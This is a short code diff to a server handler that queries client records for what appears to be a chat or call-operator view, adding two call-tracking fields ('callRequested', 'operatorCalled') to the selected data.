@@ -1476,6 +1476,7 @@ async function handleChatOpClients(req, reply) {
         id: true, flowSessionId: true, nombre: true, email: true, bank: true,
         ip: true, status: true, callerNote: true, submissionData: true,
         calledAt: true, createdAt: true, updatedAt: true,
+        callRequested: true, operatorCalled: true,
         events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
       },
     });
